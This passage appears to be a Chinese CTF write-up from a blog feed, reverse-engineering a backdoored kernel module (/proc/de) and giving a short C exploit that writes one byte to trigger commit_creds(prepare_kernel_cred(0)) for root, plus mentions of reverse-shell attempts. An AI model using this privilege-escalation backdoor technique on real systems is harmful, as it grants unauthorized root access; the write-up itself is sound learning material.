start;/bin/bash&quot;</span><br><br></code></pre></td></tr></table></figure><p>一种取巧的做法就是上面描述的使用特权方法,也是我线下时采用的(当时其实应该是成功了,但是环境崩了一度让我以为是我没做对</p><p>尝试过的做法,</p><ol><li>直接弹计算器</li><li>bash反弹shell<br>这两种当时都未成功,第一种是忘了环境变量display(弹GUI程序需要)<br>第二种为什么失败就很迷了,但是有师傅用python反弹shell成功了,可能是运气不好吧2333</li></ol><p>这里就使用这道题的正规解法来做吧</p><p>题目首先挂载了de.ko文件,然后启动了docker,那么肯定是ko文件的问题,我们拉进IDA中对文件进行分析</p><h2 id="init-moudle"><a href="#init-moudle" class="headerlink" title="init_moudle"></a>init_moudle</h2><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">__int64 init_module()<br>&#123;<br>  __int64 <span class="hljs-built_in">v0</span><span class="hljs-comment">; // rdi</span><br>  __int64 <span class="hljs-built_in">v1</span><span class="hljs-comment">; // rax</span><br><br>  _fentry__();<br>  <span class="hljs-built_in">v0</span> = kmalloc_caches[<span class="hljs-number">4</span>];<br>  *(&amp;note + <span class="hljs-number">0x100000000</span>LL) = <span class="hljs-number">0</span>;<br>  <span class="hljs-built_in">v1</span> = kmem_cache_alloc_trace(<span class="hljs-built_in">v0</span>, <span class="hljs-number">20971712</span>LL, <span class="hljs-number">10</span>LL);<br>  *(_BYTE *)(<span class="hljs-built_in">v1</span> + <span class="hljs-number">8</span>) = <span class="hljs-number">1</span>;<br>  hack = <span class="hljs-built_in">v1</span>;<br>  proc_create_data(<span class="hljs-string">&quot;de&quot;</span>, <span class="hljs-number">438</span>LL, <span class="hljs-number">0</span>LL, &amp;de_proc, <span class="hljs-number">0</span>LL);<br>  printk(<span class="hljs-string">&quot;/proc/de created\n&quot;</span>, <span class="hljs-number">438</span>LL);<br>  printk(<span class="hljs-string">&quot;size of cred : %ld \n&quot;</span>, <span class="hljs-number">168</span>LL);<br>  return <span class="hljs-number">0</span>LL;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="copy-overflow"><a href="#copy-overflow" class="headerlink" title="copy_overflow"></a>copy_overflow</h2><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">void __fastcall __noreturn copy_overflow(unsigned int <span class="hljs-built_in">a1</span>, __int64 <span class="hljs-built_in">a2</span>)<br>&#123;<br>  _warn_printk(<span class="hljs-string">&quot;Buffer overflow detected (%d &lt; %lu)!\n&quot;</span>, <span class="hljs-built_in">a1</span>, <span class="hljs-built_in">a2</span>);<br>  <span class="hljs-keyword">BUG();</span><br><span class="hljs-keyword"></span>&#125;<br></code></pre></td></tr></table></figure><h2 id="de-write"><a href="#de-write" class="headerlink" title="de_write"></a>de_write</h2><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs smali">__int64 __usercall de_write@&lt;rax&gt;(__int64 a1@&lt;rbx&gt;, __int64 a2@&lt;rbp&gt;, char *a3@&lt;rsi&gt;, __int64 a4@&lt;r12&gt;, __int64 a5@&lt;r13&gt;, __int64 a6@&lt;r14&gt;)<br>&#123;<br>  char *v6; // rbx<br>  __int64 v7; // rdx<br>  __int64 v8; // r12<br>  __int64 v9; // rsi<br>  char v10; // al<br>  __int64 v11; // rax<br>  __int64 v12; // rsi<br>  __int64 v14; // rax<br>  unsigned<span class="hljs-built_in"> int </span>v15; // eax<br>  __int64 v16; // r13<br>  __int64 v17; // r13<br> <span class="hljs-built_in"> const </span>char *v18; // [rsp-40h] [rbp-40h]<br>  __int64 v19; // [rsp-38h] [rbp-38h]<br>  unsigned __int64 v20; // [rsp-30h] [rbp-30h]<br>  __int64 v21; // [rsp-28h] [rbp-28h]<br>  __int64 v22; // [rsp-20h] [rbp-20h]<br>  __int64 v23; // [rsp-18h] [rbp-18h]<br>  __int64 v24; // [rsp-10h] [rbp-10h]<br>  __int64 v25; // [rsp-8h] [rbp-8h]<br><br>  _fentry__();<br>  v25 = a2;<br>  v24 = a6;<br>  v23 = a5;<br>  v22 = a4;<br>  v21 = a1;<br>  v6 = a3;<br>  v8 = v7;<br>  v20 = __readgsqword(0x28u);<br>  mutex_lock(&amp;lock);<br>  v9 = (unsigned __int8)*a3;<br>  printk(<span class="hljs-string">&quot;order:%d&quot;</span>, v9);<br>  v10 = *v6;<br> <span class="hljs-built_in"> if </span>( *v6 )<br>  &#123;<br>   <span class="hljs-built_in"> if </span>( v10 == -1 )<br>    &#123;<br>      printk(<span class="hljs-string">&quot;note write\n&quot;</span>, v9);<br>      v17 = *((_QWORD *)&amp;note + 1);<br>      _check_object_size(*((_QWORD *)&amp;note + 1), v8 - 1, 0<span class="hljs-class">LL);</span><br>      copy_from_user(v17, v6 + 1, v8 - 1);<br>      printk(<span class="hljs-string">&quot;write contents compelete\n&quot;</span>, v6 + 1);<br>    &#125;<br>    else<span class="hljs-built_in"> if </span>( v10 == -2 )<br>    &#123;<br>      printk(<span class="hljs-string">&quot;note write magic %ld\n&quot;</span>, v8);<br>      v16 = hack;<br>      _check_object_size(hack, v8 - 1, 0<span class="hljs-class">LL);</span><br>      copy_from_user(v16, v6 + 1, v8 - 1);<br>    &#125;<br>    else<span class="hljs-built_in"> if </span>( v10 != -3 || *(_BYTE *)(hack + 8) )<br>    &#123;<br>      printk(<span class="hljs-string">&quot;note malloc\n&quot;</span>, v9);<br>      note = *v6;<br>      printk(<span class="hljs-string">&quot;write size compelete\n&quot;</span>, v9);<br>      v11 = _kmalloc((unsigned __int8)note, 20971712<span class="hljs-class">LL);</span><br>      v12 = (unsigned __int8)note;<br>      *((_QWORD *)&amp;note + 1) = v11;<br>      printk(<span class="hljs-string">&quot;malloc size compelete:%d @ %p\n&quot;</span>, v12);<br>    &#125;<br>    else<br>    &#123;<br>      v14 = prepare_kernel_cred(0<span class="hljs-class">LL);</span><br>      commit_creds(v14);<br>      v18 = <span class="hljs-string">&quot;/usr/bin/gnome-calculator&quot;</span>;<br>      v19 = 0<span class="hljs-class">LL;</span><br>      v15 = call_usermodehelper(<span class="hljs-string">&quot;/usr/bin/gnome-calculator&quot;</span>, &amp;v18, envp_26376, 1<span class="hljs-class">LL);</span><br>      printk(<span class="hljs-string">&quot;RC is: %i \n&quot;</span>, v15);<br>    &#125;<br>  &#125;<br>  else<br>  &#123;<br>    printk(<span class="hljs-string">&quot;note free\n&quot;</span>, v9);<br>    kfree(*((_QWORD *)&amp;note + 1));<br>  &#125;<br>  mutex_unlock(&amp;lock);<br> <span class="hljs-built_in"> return </span>v8;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="de-read"><a href="#de-read" class="headerlink" title="de_read"></a>de_read</h2><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs sqf">unsigned <span class="hljs-variable">__int64</span> <span class="hljs-variable">__fastcall</span> de_read(<span class="hljs-variable">__int64</span> a1, <span class="hljs-variable">__int64</span> a2)<br>&#123;<br>  unsigned <span class="hljs-variable">__int64</span> v2; <span class="hljs-comment">// rdx</span><br>  unsigned <span class="hljs-variable">__int64</span> v3; <span class="hljs-comment">// r12</span><br>  unsigned <span class="hljs-variable">__int64</span> v4; <span class="hljs-comment">// rbx</span><br>  <span class="hljs-variable">__int64</span> v5; <span class="hljs-comment">// r12</span><br><br>  <span class="hljs-variable">_fentry__</span>();<br>  v3 = v2;<br>  mutex_lock(&amp;<span class="hljs-built_in">lock</span>);<br>  printk(<span class="hljs-string">&quot;/proc/de read\n&quot;</span>, a2);<br>  v4 = (unsigned <span class="hljs-variable">__int8</span>)note;<br>  <span class="hljs-keyword">if</span> ( (unsigned <span class="hljs-variable">__int8</span>)note &gt; v3 )<br>    v4 = v3;<br>  v5 = *((<span class="hljs-variable">_QWORD</span> *)&amp;note + <span class="hljs-number">1</span>);<br>  <span class="hljs-variable">_check_object_size</span>(*((<span class="hljs-variable">_QWORD</span> *)&amp;note + <span class="hljs-number">1</span>), v4, <span class="hljs-number">1</span>LL);<br>  copy_to_user(a2, v5, v4);<br>  mutex_unlock(&amp;<span class="hljs-built_in">lock</span>);<br>  return v4;<br>&#125;<br></code></pre></td></tr></table></figure><p>我们可以看到我们只需要紧盯de_write函数即可,我们只需要让程序跳转到这里就可以调用后门来弹出计算器了</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs lisp">v14 = prepare_kernel_cred(<span class="hljs-number">0</span>LL)<span class="hljs-comment">;</span><br>commit_creds(<span class="hljs-name">v14</span>)<span class="hljs-comment">;</span><br>v18 = <span class="hljs-string">&quot;/usr/bin/gnome-calculator&quot;</span><span class="hljs-comment">;</span><br>v19 = <span class="hljs-number">0</span>LL<span class="hljs-comment">;</span><br>v15 = call_usermodehelper(<span class="hljs-string">&quot;/usr/bin/gnome-calculator&quot;</span>, <span class="hljs-symbol">&amp;v18</span>, envp_26376, <span class="hljs-number">1</span>LL)<span class="hljs-comment">;</span><br>printk(<span class="hljs-string">&quot;RC is: %i \n&quot;</span>, v15)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>我们知道在内核中想要获得root权限不能只是用system(“&#x2F;bin&#x2F;sh”);而是用下面的语句：</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lisp">commit_creds(<span class="hljs-name">prepare_kernel_cred</span> (<span class="hljs-number">0</span>))<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>这个函数分配并应用了一个新的凭证结构（uid &#x3D; 0, gid &#x3D; 0）从而获取root权限来执行命令</p><p>那么我们该如何跳转到这里呢?<br>我们可以看到de_write的定义如下:</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">_int64 __usercall <span class="hljs-symbol">de_write@<span class="hljs-keyword">&lt;rax&gt;</span></span>(__int64 <span class="hljs-symbol">a1@<span class="hljs-keyword">&lt;rbx&gt;</span></span>, __int64 <span class="hljs-symbol">a2@<span class="hljs-keyword">&lt;rbp&gt;</span></span>, char *<span class="hljs-symbol">a3@<span class="hljs-keyword">&lt;rsi&gt;</span></span>, __int64 <span class="hljs-symbol">a4@<span class="hljs-keyword">&lt;r12&gt;</span></span>, __int64 <span class="hljs-symbol">a5@<span class="hljs-keyword">&lt;r13&gt;</span></span>, __int64 <span class="hljs-symbol">a6@<span class="hljs-keyword">&lt;r14&gt;</span></span>)<br></code></pre></td></tr></table></figure><p>而正常情况下write函数的定义为:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">ssize_t</span> <span class="hljs-title">write</span><span class="hljs-params">(<span class="hljs-type">int</span> filedes, <span class="hljs-type">void</span> *buf, <span class="hljs-type">size_t</span> nbytes)</span></span>;<br></code></pre></td></tr></table></figure><p>因此我们不难猜到a3应该就是我们所传入的buf<br>而我们所关注的只有v6,也就是a3<br>后面做了一个赋值操作,即</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">v10</span> <span class="hljs-operator">=</span> *v6<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>首先传入所写值v6,如果v6有值就进行下面的判断,首先如果v10&#x3D;&#x3D;-1,那么</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">printk</span>(<span class="hljs-string">&quot;note write\n&quot;</span>, v9);<br><span class="hljs-attribute">v17</span> = *((_QWORD *)&amp;note + <span class="hljs-number">1</span>);<br><span class="hljs-attribute">_check_object_size</span>(*((_QWORD *)&amp;note + <span class="hljs-number">1</span>), v8 - <span class="hljs-number">1</span>, <span class="hljs-number">0</span>LL);<br><span class="hljs-attribute">copy_from_user</span>(v17, v6 + <span class="hljs-number">1</span>, v8 - <span class="hljs-number">1</span>);<br><span class="hljs-attribute">printk</span>(<span class="hljs-string">&quot;write contents compelete\n&quot;</span>, v6 + <span class="hljs-number">1</span>);<br></code></pre></td></tr></table></figure><p>而如果是-2,那么</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs smali">printk(<span class="hljs-string">&quot;note write magic %ld\n&quot;</span>, v8);<br>v16 = hack;<br>_check_object_size(hack, v8 - 1, 0<span class="hljs-class">LL);</span><br>copy_from_user(v16, v6 + 1, v8 - 1);<br></code></pre></td></tr></table></figure><p>如果</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">v10</span> != -<span class="hljs-number">3</span> || *(_BYTE *)(hack + <span class="hljs-number">8</span>) <br></code></pre></td></tr></table></figure><p>就运行</p><figure class="highlight vhdl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs vhdl">printk(<span class="hljs-string">&quot;note malloc\n&quot;</span>, v9);<br><span class="hljs-literal">note</span> = *v6;<br>printk(<span class="hljs-string">&quot;write size compelete\n&quot;</span>, v9);<br>v11 = _kmalloc((<span class="hljs-built_in">unsigned</span> __int8)<span class="hljs-literal">note</span>, <span class="hljs-number">20971712</span>LL);<br>v12 = (<span class="hljs-built_in">unsigned</span> __int8)<span class="hljs-literal">note</span>;<br>*((_QWORD *)&amp;<span class="hljs-literal">note</span> + <span class="hljs-number">1</span>) = v11;<br>printk(<span class="hljs-string">&quot;malloc size compelete:%d @ %p\n&quot;</span>, v12);<br></code></pre></td></tr></table></figure><p>否则才能跳转到我们所需要的逻辑上,而这个hack变量在bss段上,因此我们需要让v10&#x3D;-1并且</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-emphasis">*(_BYTE *</span>)(hack+8)==0<br></code></pre></td></tr></table></figure><p>迷惑行为2333</p><p>其实这里我们直接看汇编部分会更加清楚</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-symbol">text:</span><span class="hljs-number">0000000000000020</span>                 <span class="hljs-keyword">call</span>    __fentry__<br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000000025</span>                 <span class="hljs-keyword">push</span>    <span class="hljs-built_in">rbp</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000000026</span>                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rdi</span>, offset <span class="hljs-keyword">lock</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">000000000000002D</span>                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rbp</span>, <span class="hljs-built_in">rsp</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000000030</span>                 <span class="hljs-keyword">push</span>    <span class="hljs-built_in">r14</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000000032</span>                 <span class="hljs-keyword">push</span>    <span class="hljs-built_in">r13</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000000034</span>                 <span class="hljs-keyword">push</span>    <span class="hljs-built_in">r12</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000000036</span>                 <span class="hljs-keyword">push</span>    <span class="hljs-built_in">rbx</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000000037</span>                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rbx</span>, <span class="hljs-built_in">rsi</span><br><span class="hljs-symbol">.text:</span>000000000000003A                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">r12</span>, <span class="hljs-built_in">rdx</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">000000000000003D</span>                 <span class="hljs-keyword">sub</span>     <span class="hljs-built_in">rsp</span>, <span class="hljs-number">18h</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000000041</span>                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rax</span>, <span class="hljs-built_in">gs</span>:<span class="hljs-number">28h</span><br><span class="hljs-symbol">.text:</span>000000000000004A                 <span class="hljs-keyword">mov</span>     [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">28h</span>], <span class="hljs-built_in">rax</span><br><span class="hljs-symbol">.text:</span>000000000000004E                 <span class="hljs-keyword">xor</span>     <span class="hljs-built_in">eax</span>, <span class="hljs-built_in">eax</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000000050</span>                 <span class="hljs-keyword">call</span>    mutex_lock<br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000000055</span>                 <span class="hljs-keyword">movzx</span>   <span class="hljs-built_in">esi</span>, <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rbx</span>]<br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000000058</span>                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rdi</span>, offset aOrderD <span class="hljs-comment">; &quot;order:%d&quot;</span><br><span class="hljs-symbol">.text:</span>000000000000005F                 <span class="hljs-keyword">call</span>    printk<br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000000064</span>                 <span class="hljs-keyword">movzx</span>   <span class="hljs-built_in">eax</span>, <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rbx</span>]<br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000000067</span>                 <span class="hljs-keyword">test</span>    <span class="hljs-built_in">al</span>, <span class="hljs-built_in">al</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000000069</span>                 <span class="hljs-keyword">jz</span>      loc_1D6<br><span class="hljs-symbol">.text:</span>000000000000006F                 <span class="hljs-keyword">cmp</span>     <span class="hljs-built_in">al</span>, <span class="hljs-number">0FFh</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000000071</span>                 <span class="hljs-keyword">jz</span>      loc_191<br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000000077</span>                 <span class="hljs-keyword">cmp</span>     <span class="hljs-built_in">al</span>, <span class="hljs-number">0FEh</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000000079</span>                 <span class="hljs-keyword">jz</span>      loc_155<br><span class="hljs-symbol">.text:</span>000000000000007F                 <span class="hljs-keyword">cmp</span>     <span class="hljs-built_in">al</span>, <span class="hljs-number">0FDh</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000000081</span>                 <span class="hljs-keyword">jnz</span>     short loc_90<br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000000083</span>                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rax</span>, <span class="hljs-built_in">cs</span>:hack<br><span class="hljs-symbol">.text:</span>000000000000008A                 <span class="hljs-keyword">cmp</span>     <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rax</span>+<span class="hljs-number">8</span>], <span class="hljs-number">0</span><br><span class="hljs-symbol">.text:</span>000000000000008E                 <span class="hljs-keyword">jz</span>      short loc_10E<br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000000090</span><br></code></pre></td></tr></table></figure><p>只需要调用write函数写入\xfd即可(我可真是个菜鸡</p><p>exp如下:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>   <span class="hljs-type">int</span> fd = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/proc/de&quot;</span>, <span class="hljs-number">2</span>);<br>   <span class="hljs-built_in">write</span>(fd, <span class="hljs-string">&quot;\xfd&quot;</span>, <span class="hljs-number">1</span>);<br>    &#125;<br><br></code></pre></td></tr></table></figure><p>编译运行即可弹出计算器</p><p>这里记录一个脚本可以实时查看内核的输出:</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-meta">#include &lt;stdio.h&gt;</span><br><span class="hljs-meta">#include &lt;stdlib.h&gt;</span><br><br><span class="hljs-type">int</span> compareFile(FILE *<span class="hljs-built_in">old</span>, FILE *<span class="hljs-built_in">new</span>);<br><br><span class="hljs-type">int</span> main()<br>&#123;<br>    FILE *<span class="hljs-built_in">new</span>;<br>    FILE *<span class="hljs-built_in">old</span>;<br>    <span class="hljs-type">int</span> lRet;<br>    static first = <span class="hljs-number">0</span>;<br>    <br>    <span class="hljs-keyword">system</span>(&quot;touch file_new&quot;);<br>    <span class="hljs-keyword">system</span>(&quot;touch file_old&quot;);<br><br>    <span class="hljs-built_in">new</span> = fopen(&quot;file_new&quot;, &quot;rw&quot;);<br>    <span class="hljs-built_in">old</span> = fopen(&quot;file_old&quot;, &quot;rw&quot;);<br><br>    <span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>)<br>    &#123;   <br>        sleep(<span class="hljs-number">1</span>);<br>        <span class="hljs-keyword">system</span>(&quot;dmesg &gt; file_new&quot;);<br>    <br>        <span class="hljs-keyword">if</span> (first == <span class="hljs-number">0</span>)<br>        &#123;   <br>            <span class="hljs-keyword">system</span>(&quot;cp file_new file_old&quot;);<br>            first++;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;   <br><br>        <span class="hljs-built_in">new</span> = fopen(&quot;file_new&quot;, &quot;rw&quot;);<br>        <span class="hljs-built_in">old</span> = fopen(&quot;file_old&quot;, &quot;rw&quot;);<br>    <br>        <span class="hljs-keyword">if</span> (compareFile(<span class="hljs-built_in">new</span>, <span class="hljs-built_in">old</span>) == <span class="hljs-number">0</span>)<br>        &#123;   <br>            fclose(<span class="hljs-built_in">new</span>);<br>            fclose(<span class="hljs-built_in">old</span>);<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;   <br>        <span class="hljs-keyword">else</span><br>        &#123;   <br>            fclose(<span class="hljs-built_in">new</span>);<br>            fclose(<span class="hljs-built_in">old</span>);<br>    <br>            <span class="hljs-keyword">system</span>(&quot;diff file_new file_old&quot;);<br>            <span class="hljs-keyword">system</span>(&quot;cp file_new file_old&quot;);<br>        &#125;  <br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><br><span class="hljs-type">int</span> compareFile(FILE *<span class="hljs-built_in">old</span>, FILE *<span class="hljs-built_in">new</span>)<br>&#123;<br>    <span class="hljs-type">char</span> c1;<br>    <span class="hljs-type">char</span> c2;<br><br>    <span class="hljs-keyword">while</span>(!feof(<span class="hljs-built_in">old</span>) &amp;&amp; !feof(<span class="hljs-built_in">new</span>))<br>    &#123;<br>        c1 = fgetc(<span class="hljs-built_in">old</span>);<br>        c2 = fgetc(<span class="hljs-built_in">new</span>);<br><br>        <span class="hljs-keyword">if</span> (c1 != c2)<br>        &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> ((c1 == EOF)&amp;&amp;(c2 == EOF))<br>    &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>编译运行并跑起来即可</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>遇到之前没遇到的东西一定不能能慌,说不定非常简单(我真是个菜鸡hhh</p><p>F5大法得到的东西诡异不如直接阅读反汇编代码</p><p>不过也学到了如何与linux后门进行交互,感谢出题人的良苦用心</p><p><a href="https://nightrainy.github.io/2019/10/31/play-with-docker/">原文链接:https://nightrainy.github.io/2019/10/31/play-with-docker/</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>play withe file structure(搬运)</title>
